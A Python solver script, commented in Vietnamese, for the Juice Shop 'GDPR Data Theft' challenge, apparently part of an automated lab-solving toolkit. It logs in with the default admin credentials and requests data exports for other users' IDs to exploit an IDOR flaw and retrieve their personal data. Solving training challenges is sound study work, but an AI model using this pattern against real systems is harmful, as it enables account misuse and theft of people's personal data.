from core.base_solver import BaseSolver
from loguru import logger

class GdprDataTheftSolver(BaseSolver):
    """
    Challenge: GDPR Data Theft (dataExportChallenge)
    
    Theo source code dataExport.ts:
    - Line 53: memories được lấy theo req.body.UserId (IDOR bug!)
    - Line 100: Challenge solved khi orderId prefix !== emailHash của logged-in user
    
    Cách giải: Login as user A, request export với UserId của user B
    → Nhận memories của B (personal data theft!)
    """
    @property
    def challenge_key(self) -> str:
        return "dataExportChallenge"

    def solve(self) -> bool:
        # Step 1: Login as admin
        login_res = self.client.post("/rest/user/login", json={
            "email": "admin@juice-sh.op", 
            "password": "admin123"
        })
        token = login_res.json().get("authentication", {}).get("token")
        bid = login_res.json().get("authentication", {}).get("bid")
        if not token: 
            logger.error("Failed to login as admin")
            return False
        
        headers = {"Authorization": f"Bearer {token}"}
        
        # Step 2: Add item and checkout to create order
        self.client.post("/api/BasketItems", json={
            "ProductId": 1, "BasketId": str(bid), "quantity": 1
        }, headers=headers)
        self.client.post(f"/rest/basket/{bid}/checkout", headers=headers)
        
        # Step 3: IDOR - Request data-export với UserId của user khác
        # UserId 2 = Jim (có memories trong database)
        # UserId 22 = bjoernOwasp (có memories)
        for user_id in [22, 2, 3, 4, 5]:
            payload = {"UserId": user_id}
            res = self.client.post("/rest/user/data-export", json=payload, headers=headers)
            
            if res.ok:
                data = res.json().get("userData", "")
                if "memories" in data and '"caption"' in data:
                    logger.info(f"Found memories for UserId {user_id}!")
        
        # Step 4: Trigger verify bằng cách gọi products
        self.client.get("/rest/products/search?q=")
        
        return True
